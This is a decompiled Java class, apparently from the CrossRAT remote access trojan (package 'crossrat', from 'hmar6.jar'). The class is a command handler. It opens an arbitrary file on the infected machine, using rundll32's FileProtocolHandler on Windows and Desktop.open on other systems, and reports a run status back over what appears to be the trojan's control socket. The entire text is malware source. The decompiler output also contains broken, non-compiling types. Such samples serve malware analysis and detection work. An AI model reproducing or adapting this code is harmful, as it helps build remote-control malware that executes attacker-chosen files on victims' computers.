package crossrat;

import java.awt.Desktop;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;

/* loaded from: hmar6.jar:crossrat/i.class */
final class i extends Thread {

    /* renamed from: a */
    private String f38a;

    public i(String str) {
        this.f38a = str;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v10, types: [a.c] */
    /* JADX WARN: Type inference failed for: r0v11, types: [java.io.IOException] */
    /* JADX WARN: Type inference failed for: r0v13, types: [java.lang.Process] */
    /* JADX WARN: Type inference failed for: r0v2 */
    /* JADX WARN: Type inference failed for: r0v21, types: [boolean] */
    /* JADX WARN: Type inference failed for: r0v22, types: [java.io.IOException] */
    /* JADX WARN: Type inference failed for: r0v23, types: [java.awt.Desktop] */
    /* JADX WARN: Type inference failed for: r0v24, types: [java.io.DataOutputStream] */
    /* JADX WARN: Type inference failed for: r0v27 */
    /* JADX WARN: Type inference failed for: r0v28 */
    /* JADX WARN: Type inference failed for: r0v29 */
    /* JADX WARN: Type inference failed for: r0v3, types: [java.lang.Exception] */
    /* JADX WARN: Type inference failed for: r0v32 */
    /* JADX WARN: Type inference failed for: r0v33 */
    /* JADX WARN: Type inference failed for: r0v34 */
    /* JADX WARN: Type inference failed for: r0v6 */
    /* JADX WARN: Type inference failed for: r0v7, types: [java.lang.Exception] */
    /* JADX WARN: Type inference failed for: r0v8, types: [java.io.DataOutputStream] */
    @Override // java.lang.Thread, java.lang.Runnable
    public final void run() {
        File file = new File(this.f38a);
        a.a b2 = a.c.b();
        ?? r0 = 0;
        boolean z = false;
        try {
            r0 = new DataOutputStream(k.k.getOutputStream());
            z = r0;
        } catch (Exception e) {
            r0.printStackTrace();
        }
        boolean exists = file.exists();
        Desktop desktop = exists;
        if (exists) {
            ?? a2 = b2.a();
            if (a2 == a.c.WINDOWS) {
                try {
                    a2 = Runtime.getRuntime().exec(new String[]{"rundll32", "url.dll,FileProtocolHandler", file.getAbsolutePath()});
                    desktop = a2;
                } catch (IOException e2) {
                    a2.printStackTrace();
                    desktop = a2;
                }
            } else {
                Desktop a3 = b2.a();
                Desktop desktop2 = a3;
                if (a3 != a.c.MACOS) {
                    a.c a4 = b2.a();
                    desktop2 = a4;
                    if (a4 != a.c.LINUX) {
                        ?? isDesktopSupported = Desktop.isDesktopSupported();
                        desktop = isDesktopSupported;
                        if (isDesktopSupported != 0) {
                            try {
                                isDesktopSupported = Desktop.getDesktop();
                                isDesktopSupported.open(file);
                                desktop = isDesktopSupported;
                            } catch (IOException e3) {
                                isDesktopSupported.printStackTrace();
                                desktop = isDesktopSupported;
                            }
                        }
                    }
                }
                try {
                    desktop2 = Desktop.getDesktop();
                    desktop2.open(file);
                    desktop = desktop2;
                } catch (IOException e4) {
                    desktop2.printStackTrace();
                    desktop = desktop2;
                }
            }
        }
        try {
            desktop = z;
            desktop.writeBytes(String.valueOf(k.g) + k.arg_delimit + k.Run_DLL_Status + k.arg_delimit + "&&&");
        } catch (Exception e5) {
            desktop.printStackTrace();
        }
    }
}
